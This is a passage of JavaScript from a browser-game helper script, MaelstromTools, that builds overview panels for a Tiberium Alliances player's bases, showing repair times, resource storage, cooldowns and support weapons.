                  this.Cache[cname]["Base"]["Level"] = MaelstromTools.Wrapper.GetBaseLevel(ncity); 
                  this.Cache[cname]["Base"]["UnitLimit"] = ncity.GetBuildingSlotLimit(); //ncity.GetNumBuildings(); 
                  this.Cache[cname]["Base"]["TotalHeadCount"] = ncity.GetBuildingSlotCount(); 
                  this.Cache[cname]["Base"]["FreeHeadCount"] = this.Cache[cname]["Base"]["UnitLimit"] - this.Cache[cname]["Base"]["TotalHeadCount"]; 
                  this.Cache[cname]["Base"]["HealthInPercent"] = ncity.GetBuildingsConditionInPercent(); 
 
                  this.Cache[cname]["Offense"] = Object(); 
                  this.Cache[cname]["Offense"]["Level"] = (Math.floor(ncity.get_LvlOffense() * 100) / 100).toFixed(2); 
                  this.Cache[cname]["Offense"]["UnitLimit"] = unitsData.get_UnitLimitOffense(); 
                  this.Cache[cname]["Offense"]["TotalHeadCount"] = unitsData.get_TotalOffenseHeadCount(); 
                  this.Cache[cname]["Offense"]["FreeHeadCount"] = unitsData.get_FreeOffenseHeadCount(); 
                  this.Cache[cname]["Offense"]["HealthInPercent"] = offHealth > 0 ? offHealth : 0; 
 
                  this.Cache[cname]["Defense"] = Object(); 
                  this.Cache[cname]["Defense"]["Level"] = (Math.floor(ncity.get_LvlDefense() * 100) / 100).toFixed(2); 
                  this.Cache[cname]["Defense"]["UnitLimit"] = unitsData.get_UnitLimitDefense(); 
                  this.Cache[cname]["Defense"]["TotalHeadCount"] = unitsData.get_TotalDefenseHeadCount(); 
                  this.Cache[cname]["Defense"]["FreeHeadCount"] = unitsData.get_FreeDefenseHeadCount(); 
                  this.Cache[cname]["Defense"]["HealthInPercent"] = ncity.GetDefenseConditionInPercent() > 0 ? ncity.GetDefenseConditionInPercent() : 0; 
 
                  //console.log(ncity.get_CityUnitsData().get_UnitLimitOffense() + " / " + ncity.get_CityUnitsData().get_TotalOffenseHeadCount() + " = " + ncity.get_CityUnitsData().get_FreeOffenseHeadCount()); 
                  //console.log(ncity.get_CityUnitsData().get_UnitLimitDefense() + " / " + ncity.get_CityUnitsData().get_TotalDefenseHeadCount() + " = " + ncity.get_CityUnitsData().get_FreeDefenseHeadCount()); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.RepairTime.updateCache: ", e); 
              } 
            }, 
 
            setWidgetLabels: function () { 
              try { 
                this.Widget.removeAll(); 
                var rowIdx = 1; 
 
                rowIdx = this.createOverviewLabels(rowIdx); 
                rowIdx = this.createRepairchargeLabels(rowIdx); 
              } catch (e) { 
                console.log("MaelstromTools.RepairTime.setWidgetLabels: ", e); 
              } 
            }, 
 
            createRepairchargeLabels: function (rowIdx) { 
              try { 
                var colIdx = 2; 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx++, "Repaircharges", null, 'left', null, null, 3); 
                colIdx = 2; 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Statics.Infantry, 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Statics.Vehicle, 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Statics.Aircraft, 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Repairtime", 80, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Attacks", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Next at", 80, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Max+1 at", 80, 'right'); 
 
                rowIdx++; 
                for (var cityName in this.Cache) { 
                  var cityCache = this.Cache[cityName]; 
                  if (cityCache.Offense.UnitLimit == 0) { 
                    continue; 
                  } 
                  colIdx = 1; 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityName, 80, 'left'); 
 
                  // Skip bases with no armies 
                  if (cityCache.Offense.UnitLimit > 0) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatTimespan(cityCache.RepairTime.Infantry), 60, 'right', null, (cityCache.RepairTime.Infantry == cityCache.RepairTime.LargestDiv ? "yellow" : "white")); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatTimespan(cityCache.RepairTime.Vehicle), 60, 'right', null, (cityCache.RepairTime.Vehicle == cityCache.RepairTime.LargestDiv ? "yellow" : "white")); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatTimespan(cityCache.RepairTime.Aircraft), 60, 'right', null, (cityCache.RepairTime.Aircraft == cityCache.RepairTime.LargestDiv ? "yellow" : "white")); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatTimespan(cityCache.Repaircharge.Smallest), 80, 'right'); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.RepairTime.PossibleAttacks + " / " + cityCache.RepairTime.MaxAttacks, 60, 'right', null, (cityCache.Offense.HealthInPercent !== 100 ? 'red' : null)); // mark red when unhealthy 
                    var i = cityCache.RepairTime.LargestDiv * cityCache.RepairTime.PossibleAttacks; 
                    var j = cityCache.RepairTime.LargestDiv * cityCache.RepairTime.MaxAttacks; 
                    (i>0) ? MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatTimespan(i), 80, 'right', null, (i > cityCache.RepairTime.Maximum ? "yellow" : "white")) : colIdx++; /// yellow if more than Maximum RT 
                    (j>0) ? MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatTimespan(j), 80, 'right') : colIdx++; 
                  } else { 
                    colIdx += 7; 
                  } 
 
                  colIdx += 4; 
                  MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, MaelstromTools.Util.getAccessBaseButton(cityName, PerforceChangelist >= 376877 ? ClientLib.Data.PlayerAreaViewMode.pavmPlayerOffense : webfrontend.gui.PlayArea.PlayArea.modes.EMode_PlayerOffense)); 
                  rowIdx += 2; 
                } 
 
                return rowIdx; 
              } catch (e) { 
                console.log("MaelstromTools.RepairTime.createRepairchargeLabels: ", e); 
              } 
            }, 
 
            createOverviewLabels: function (rowIdx) { 
              try { 
                var colIdx = 2; 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx, "Base", 60, 'right'); 
                colIdx += 3; 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx, "Defense", 60, 'right'); 
                colIdx += 3; 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx, "Army", 60, 'right'); 
 
                rowIdx++; 
                colIdx = 2; 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Level", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Buildings", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Health", 60, 'right'); 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Level", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Buildings", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Health", 60, 'right'); 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Level", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Units", 60, 'right'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Health", 60, 'right'); 
 
                rowIdx++; 
                for (var cityName in this.Cache) { 
                  var cityCache = this.Cache[cityName]; 
                  colIdx = 1; 
 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityName, 80, 'left'); 
 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Base.Level, 60, 'right'); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Base.TotalHeadCount + " / " + cityCache.Base.UnitLimit, 60, 'right', null, (cityCache.Base.FreeHeadCount >= 1 ? "red" : "white")); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Base.HealthInPercent + "%", 60, 'right', null, (cityCache.Base.HealthInPercent < 25 ? "red" : (cityCache.Base.HealthInPercent < 100 ? "yellow" : "white"))); 
 
                  if (cityCache.Defense.UnitLimit > 0) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Defense.Level, 60, 'right'); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Defense.TotalHeadCount + " / " + cityCache.Defense.UnitLimit, 60, 'right', null, (cityCache.Defense.FreeHeadCount >= 5 ? "red" : (cityCache.Defense.FreeHeadCount >= 3 ? "yellow" : "white"))); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Defense.HealthInPercent + "%", 60, 'right', null, (cityCache.Defense.HealthInPercent < 25 ? "red" : (cityCache.Defense.HealthInPercent < 100 ? "yellow" : "white"))); 
                  } else { 
                    colIdx += 3; 
                  } 
 
                  // Skip bases with no armies 
                  if (cityCache.Offense.UnitLimit > 0) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Offense.Level, 60, 'right'); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Offense.TotalHeadCount + " / " + cityCache.Offense.UnitLimit, 60, 'right', null, (cityCache.Offense.FreeHeadCount >= 10 ? "red" : (cityCache.Offense.FreeHeadCount >= 5 ? "yellow" : "white"))); 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.Offense.HealthInPercent + "%", 60, 'right', null, (cityCache.Offense.HealthInPercent < 25 ? "red" : (cityCache.Offense.HealthInPercent < 100 ? "yellow" : "white"))); 
                  } else { 
                    colIdx += 3; 
                  } 
 
                  MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, MaelstromTools.Util.getAccessBaseButton(cityName)); 
                  rowIdx += 2; 
                } 
                return rowIdx; 
              } catch (e) { 
                console.log("MaelstromTools.RepairTime.createOverviewLabels: ", e); 
              } 
            } 
 
          } 
        }); 
 
        // define ResourceOverview 
        qx.Class.define("MaelstromTools.ResourceOverview", { 
          type: "singleton", 
          extend: MaelstromTools.DefaultObject, 
          members: { 
            Table: null, 
            Model: null, 
 
            updateCache: function () { 
              try { 
                MT_Cache.updateCityCache(); 
                this.Cache = Object(); 
 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  var mtime = ClientLib.Data.MainData.GetInstance().get_Time(); 
 
                  this.Cache[cname] = Object(); 
                  this.Cache[cname][MaelstromTools.Statics.Tiberium] = ncity.GetResourceCount(ClientLib.Base.EResourceType.Tiberium); 
                  this.Cache[cname][MaelstromTools.Statics.Tiberium + "Max"] = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.Tiberium); 
                  this.Cache[cname][MaelstromTools.Statics.Tiberium + "Full"] = mtime.GetJSStepTime(ncity.GetResourceStorageFullStep(ClientLib.Base.EResourceType.Tiberium)); 
                  this.Cache[cname][MaelstromTools.Statics.Crystal] = ncity.GetResourceCount(ClientLib.Base.EResourceType.Crystal); 
                  this.Cache[cname][MaelstromTools.Statics.Crystal + "Max"] = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.Crystal); 
                  this.Cache[cname][MaelstromTools.Statics.Crystal + "Full"] = mtime.GetJSStepTime(ncity.GetResourceStorageFullStep(ClientLib.Base.EResourceType.Crystal)); 
                  this.Cache[cname][MaelstromTools.Statics.Power] = ncity.GetResourceCount(ClientLib.Base.EResourceType.Power); 
                  this.Cache[cname][MaelstromTools.Statics.Power + "Max"] = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.Power); 
                  this.Cache[cname][MaelstromTools.Statics.Power + "Full"] = mtime.GetJSStepTime(ncity.GetResourceStorageFullStep(ClientLib.Base.EResourceType.Power)); 
                } 
 
              } catch (e) { 
                console.log("MaelstromTools.ResourceOverview.updateCache: ", e); 
              } 
            }, 
/* 
            setWidgetLabelsTable: function () { 
              try { 
                if (!this.Table) { 
                  this.Widget.setLayout(new qx.ui.layout.HBox()); 
 
                  this.Model = new qx.ui.table.model.Simple(); 
                  this.Model.setColumns(["City", "Tib. Storage", "Tiberium", "Full", "Crystal", "Full", "Power", "Storage", "Full"]); 
                  this.Table = new qx.ui.table.Table(this.Model); 
                  this.Widget.add(this.Table, { 
                    flex: 1 
                  }); 
                } 
 
                var Totals = Object(); 
                Totals[MaelstromTools.Statics.Tiberium] = 0; 
                Totals[MaelstromTools.Statics.Crystal] = 0; 
                Totals[MaelstromTools.Statics.Power] = 0; 
                Totals[MaelstromTools.Statics.Tiberium + "Max"] = 0; 
                Totals[MaelstromTools.Statics.Power + "Max"] = 0; 
 
                var rowData = []; 
 
                for (var cityName in this.Cache) { 
                  var cityCache = this.Cache[cityName]; 
 
                  Totals[MaelstromTools.Statics.Tiberium] += cityCache[MaelstromTools.Statics.Tiberium]; 
                  Totals[MaelstromTools.Statics.Crystal] += cityCache[MaelstromTools.Statics.Crystal]; 
                  Totals[MaelstromTools.Statics.Power] += cityCache[MaelstromTools.Statics.Power]; 
                  Totals[MaelstromTools.Statics.Tiberium + "Max"] += cityCache[MaelstromTools.Statics.Tiberium + 'Max']; 
                  Totals[MaelstromTools.Statics.Power + "Max"] += cityCache[MaelstromTools.Statics.Power + 'Max']; 
 
                  rowData.push([ 
                    cityName, 
                    MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Tiberium + 'Max']), 
                    MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Tiberium]), 
                    MaelstromTools.Wrapper.GetDateTimeString(cityCache[MaelstromTools.Statics.Tiberium + 'Full']), 
                    MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Crystal]), 
                    MaelstromTools.Wrapper.GetDateTimeString(cityCache[MaelstromTools.Statics.Crystal + 'Full']), 
                    MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Power]), 
                    MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Power + 'Max']), 
                    MaelstromTools.Wrapper.GetDateTimeString(cityCache[MaelstromTools.Statics.Power + 'Full']) 
                    ]); 
                } 
                rowData.push([ 
                  'Total resources', 
                  MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Tiberium + 'Max']), 
                  MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Tiberium]), 
                  '', 
                  MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Crystal]), 
                  '', 
                  MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Power]), 
                  MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Power + 'Max']), 
                  '' 
                  ]); 
 
                this.Model.setData(rowData); 
              } catch (e) { 
                console.log("MaelstromTools.ResourceOverview.setWidgetLabels: ", e); 
              } 
            }, 
 
            */ 
            setWidgetLabels: function () { 
              try { 
                this.Widget.removeAll(); 
 
                var first = true; 
                var rowIdx = 2; 
                var Totals = Object(); 
                var colIdx = 1; 
                Totals[MaelstromTools.Statics.Tiberium] = 0; 
                Totals[MaelstromTools.Statics.Crystal] = 0; 
                Totals[MaelstromTools.Statics.Power] = 0; 
                Totals[MaelstromTools.Statics.Tiberium + "Max"] = 0; 
                Totals[MaelstromTools.Statics.Power + "Max"] = 0; 
 
                for (var cityName in this.Cache) { 
                  var cityCache = this.Cache[cityName]; 
                  Totals[MaelstromTools.Statics.Tiberium] += cityCache[MaelstromTools.Statics.Tiberium]; 
                  Totals[MaelstromTools.Statics.Crystal] += cityCache[MaelstromTools.Statics.Crystal]; 
                  Totals[MaelstromTools.Statics.Power] += cityCache[MaelstromTools.Statics.Power]; 
                  Totals[MaelstromTools.Statics.Tiberium + "Max"] += cityCache[MaelstromTools.Statics.Tiberium + 'Max']; 
                  Totals[MaelstromTools.Statics.Power + "Max"] += cityCache[MaelstromTools.Statics.Power + 'Max']; 
 
                  colIdx = 1; 
 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityName, 100, 'left'); 
                  if (first) { 
                    MaelstromTools.Util.addLabel(this.Widget, 1, colIdx, 'Max. storage', 80, 'left'); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Tiberium + 'Max']), 80, 'right'); 
 
                  if (first) { 
                    MaelstromTools.Util.addImage(this.Widget, 1, colIdx, MaelstromTools.Util.getImage(MaelstromTools.Statics.Tiberium)); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Tiberium]), 60, 'right', null, (cityCache[MaelstromTools.Statics.Tiberium] >= cityCache[MaelstromTools.Statics.Tiberium + 'Max'] ? "red" : (cityCache[MaelstromTools.Statics.Tiberium] >= (0.75 * cityCache[MaelstromTools.Statics.Tiberium + 'Max']) ? "yellow" : "white"))); 
 
                  if (cityCache[MaelstromTools.Statics.Tiberium] < cityCache[MaelstromTools.Statics.Tiberium + 'Max']) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.GetDateTimeString(cityCache[MaelstromTools.Statics.Tiberium + 'Full']), 100, 'right', null, (cityCache[MaelstromTools.Statics.Tiberium] >= (0.75 * cityCache[MaelstromTools.Statics.Tiberium + 'Max']) ? "yellow" : "white")); 
                  } else { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Storage full!", 100, 'right', null, "red"); 
                  } 
                  if (first) { 
                    MaelstromTools.Util.addImage(this.Widget, 1, colIdx, MaelstromTools.Util.getImage(MaelstromTools.Statics.Crystal)); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Crystal]), 60, 'right', null, (cityCache[MaelstromTools.Statics.Crystal] >= cityCache[MaelstromTools.Statics.Crystal + 'Max'] ? "red" : (cityCache[MaelstromTools.Statics.Crystal] >= (0.75 * cityCache[MaelstromTools.Statics.Crystal + 'Max']) ? "yellow" : "white"))); 
 
                  if (cityCache[MaelstromTools.Statics.Crystal] < cityCache[MaelstromTools.Statics.Crystal + 'Max']) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.GetDateTimeString(cityCache[MaelstromTools.Statics.Crystal + 'Full']), 100, 'right', null, (cityCache[MaelstromTools.Statics.Crystal] >= (0.75 * cityCache[MaelstromTools.Statics.Crystal + 'Max']) ? "yellow" : "white")); 
                  } else { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Storage full!", 100, 'right', null, "red"); 
                  } 
 
                  if (first) { 
                    MaelstromTools.Util.addImage(this.Widget, 1, colIdx, MaelstromTools.Util.getImage(MaelstromTools.Statics.Power)); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Power]), 60, 'right', null, (cityCache[MaelstromTools.Statics.Power] >= cityCache[MaelstromTools.Statics.Power + 'Max'] ? "red" : (cityCache[MaelstromTools.Statics.Power] >= (0.75 * cityCache[MaelstromTools.Statics.Power + 'Max']) ? "yellow" : "white"))); 
 
                  if (first) { 
                    MaelstromTools.Util.addLabel(this.Widget, 1, colIdx, 'Storage', 80, 'left'); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[MaelstromTools.Statics.Power + 'Max']), 80, 'right'); 
 
                  if (cityCache[MaelstromTools.Statics.Power] < cityCache[MaelstromTools.Statics.Power + 'Max']) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.GetDateTimeString(cityCache[MaelstromTools.Statics.Power + 'Full']), 100, 'right', null, (cityCache[MaelstromTools.Statics.Power] >= (0.75 * cityCache[MaelstromTools.Statics.Power + 'Max']) ? "yellow" : "white")); 
                  } else { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Storage full!", 100, 'right', null, "red"); 
                  } 
 
 
                  MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, MaelstromTools.Util.getAccessBaseButton(cityName)); 
                  rowIdx++; 
                  first = false; 
                } 
 
                colIdx = 1; 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Total resources", 100, 'left', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Tiberium + 'Max']), 80, 'right', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Tiberium]), 60, 'right', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, Math.round(Totals[MaelstromTools.Statics.Tiberium] / Totals[MaelstromTools.Statics.Tiberium + 'Max'] * 100) + '%', 100, 'center', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Crystal]), 60, 'right', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, Math.round(Totals[MaelstromTools.Statics.Crystal] / Totals[MaelstromTools.Statics.Tiberium + 'Max'] * 100) + '%', 100, 'center', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Power]), 60, 'right', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.FormatNumbersCompact(Totals[MaelstromTools.Statics.Power + 'Max']), 80, 'right', 'bold'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, Math.round(Totals[MaelstromTools.Statics.Power] / Totals[MaelstromTools.Statics.Power + 'Max'] * 100) + '%', 100, 'center', 'bold'); 
              } catch (e) { 
                console.log("MaelstromTools.ResourceOverview.setWidgetLabels: ", e); 
              } 
            } 
          } 
        }); 
 
        // define BaseStatus 
        qx.Class.define("MaelstromTools.BaseStatus", { 
          type: "singleton", 
          extend: MaelstromTools.DefaultObject, 
          members: { 
            CityMenuButtons: null, 
 
            //City.SetDedicatedSupport 
            //City.RecallDedicatedSupport 
            //City.get_SupportDedicatedBaseId 
            //System.String get_SupportDedicatedBaseName () 
            updateCache: function () { 
              try { 
                MT_Cache.updateCityCache(); 
                this.Cache = Object(); 
 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  var player = ClientLib.Data.MainData.GetInstance().get_Player(); 
                  var supportData = ncity.get_SupportData(); 
                  //System.String get_PlayerName () 
                  this.Cache[cname] = Object(); 
                  // Movement lock 
                  this.Cache[cname]["HasCooldown"] = ncity.get_hasCooldown(); 
                  this.Cache[cname]["CooldownEnd"] = Math.max(ncity.get_MoveCooldownEndStep(), ncity.get_MoveRestictionEndStep()); 
                  this.Cache[cname]["MoveCooldownEnd"] = ncity.get_MoveCooldownEndStep(); 
                  this.Cache[cname]["MoveLockdownEnd"] = ncity.get_MoveRestictionEndStep(); 
                  this.Cache[cname]["IsProtected"] = ncity.get_isProtected(); 
                  this.Cache[cname]["ProtectionEnd"] = ncity.get_ProtectionEndStep(); 
                  this.Cache[cname]["IsProtected"] = ncity.get_ProtectionEndStep(); 
                  this.Cache[cname]["IsAlerted"] = ncity.get_isAlerted(); 
 
                  // Supportweapon 
                  if (supportData == null) { 
                    this.Cache[cname]["HasSupportWeapon"] = false; 
                  } else { 
                    this.Cache[cname]["HasSupportWeapon"] = true; 
                    if (ncity.get_SupportDedicatedBaseId() > 0) { 
                      this.Cache[cname]["SupportedCityId"] = ncity.get_SupportDedicatedBaseId(); 
                      this.Cache[cname]["SupportedCityName"] = ncity.get_SupportDedicatedBaseName(); 
                      var coordId = ncity.get_SupportDedicatedBaseCoordId(); 
                      this.Cache[cname]["SupportedCityX"] = (coordId & 0xffff); 
                      this.Cache[cname]["SupportedCityY"] = ((coordId >> 0x10) & 0xffff); 
                      /* 
                      var cityX = ncity.get_PosX(); 
                      var cityY = ncity.get_PosY(); 
                       
                      var mainData = ClientLib.Data.MainData.GetInstance(); 
                      var visRegion = ClientLib.Vis.VisMain.GetInstance().get_Region(); 
 
                      var gridW = visRegion.get_GridWidth(); 
                      var gridH = visRegion.get_GridHeight(); 
                      //console.log(cname); 
                      //console.log("x: " + cityX + " y: " + cityY); 
 
                      var worldObj = visRegion.GetObjectFromPosition((this.Cache[cname]["SupportedCityX"]*gridW), (this.Cache[cname]["SupportedCityY"]*gridH)); 
                       
                      //ClientLib.Vis.Region.RegionCity 
                      if (worldObj == null) { 
                        this.Cache[cname]["SupportTime"] = ""; 
                      } else { 
                        console.log(cname); 
                        //console.log(worldObj.CalibrationSupportDuration()); 
                        var weaponState = worldObj.get_SupportWeaponStatus(); 
                         
                        //console.log(this.calcDuration(ncity, worldObj)); 
                        var cities = ClientLib.Data.MainData.GetInstance().get_Cities(); 
                        cities.set_CurrentOwnCityId(ncity.get_Id()); 
                        var status = worldObj.get_SupportWeaponStatus(); 
                        var server = mainData.get_Server(); 
                        //console.log(worldObj.CalculateSupportCalibrationEndStep(worldObj.get_SupportData(), worldObj.get_SupportWeapon())); 
                        console.log(status); 
                        console.log(currStep); 
                        this.Cache[cname]["SupportTime"] = mainData.get_Time().GetTimespanString(worldObj.CalculateSupportCalibrationEndStep(worldObj.get_SupportData(), worldObj.get_SupportWeapon()), currStep); 
                        //status.Status&ClientLib.Vis.Region.ESupportWeaponStatus.Calibrating)==ClientLib.Vis.Region.ESupportWeaponStatus.Calibrating 
                        var currStep = ClientLib.Data.MainData.GetInstance().get_Time().GetServerStep(); 
                        //this.Cache[cname]["SupportTime"] = webfrontend.Util.getTimespanString(ClientLib.Data.MainData.GetInstance().get_Time().GetTimeSpan(Math.max(0, status.CalibrationEndStep) - currStep), false); 
                        //this.Cache[cname]["SupportTime"] = ClientLib.Data.MainData.GetInstance().get_Time().GetTimespanString(weaponState.CalibrationEndStep, currStep); 
                        //this.Cache[cname]["SupportTime"] = webfrontend.Util.getTimespanString(ClientLib.Data.MainData.GetInstance().get_Time().GetTimeSpan(Math.max(0, worldObj.CalculateSupportCalibrationEndStep(worldObj.get_SupportData(), worldObj.get_SupportWeapon()) - currStep)), false); 
                      //console.log(this.Cache[cname]["SupportTime"]); 
                      } 
                       */ 
                    } else { // prevent reference to undefined property ReferenceError 
                      this.Cache[cname]["SupportedCityId"] = null; 
                      this.Cache[cname]["SupportedCityName"] = null; 
                      this.Cache[cname]["SupportedCityX"] = null; 
                      this.Cache[cname]["SupportedCityY"] = null; 
                    } 
                    this.Cache[cname]["SupportRange"] = MaelstromTools.Wrapper.GetSupportWeaponRange(ncity.get_SupportWeapon()); 
                    var techName = ClientLib.Base.Tech.GetTechNameFromTechId(supportData.get_Type(), player.get_Faction()); 
                    this.Cache[cname]["SupportName"] = ClientLib.Base.Tech.GetProductionBuildingNameFromFaction(techName, player.get_Faction()); 
                    this.Cache[cname]["SupportLevel"] = supportData.get_Level(); 
                    //this.Cache[cname]["SupportBuilding"] = ncity.get_CityBuildingsData().GetUniqueBuildingByTechName(techName); 
                    //console.log(this.Cache[cname]["SupportBuilding"]); 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.BaseStatus.updateCache: ", e); 
              } 
            }, 
            /* 
            calcDuration: function(currOwnCity, regionCity) { 
              var targetCity = MaelstromTools.Wrapper.GetCity(regionCity.get_Id()); 
               
              var supportBase=regionCity.get_SupportData(); 
              if(supportBase == null) 
              { 
                return -1; 
              } 
              var weapon=regionCity.get_SupportWeapon(); 
              if(weapon == null) 
              { 
                return -1; 
              } 
              if(currOwnCity.get_Id() == regionCity.get_Id()) 
              { 
                if(supportBase.get_Magnitude() == 0) { 
                  return -1; 
                } 
                return 0; 
              } 
              var dx=(currOwnCity.get_X() - targetCity.get_PosX()); 
              var dy=(currOwnCity.get_Y() - targetCity.get_PosY()); 
              var distance=((dx * dx) + (dy * dy)); 
              return Math.floor((weapon.pt + (weapon.tpf * Math.floor((Math.sqrt(distance) + 0.5))))); 
            },*/ 
 
            setWidgetLabels: function () { 
              try { 
                this.Widget.removeAll(); 
                var rowIdx = 1; 
                var colIdx = 2; 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Cooldown", 85, 'left'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Protection", 85, 'left'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Available weapon", 140, 'left'); 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "Calibrated on", 140, 'left'); 
 
                //colIdx++; 
                var rowIdxRecall = rowIdx; 
                var colIdxRecall = 0; 
                var supportWeaponCount = 0; 
 
                rowIdx++; 
                for (var cityName in this.Cache) { 
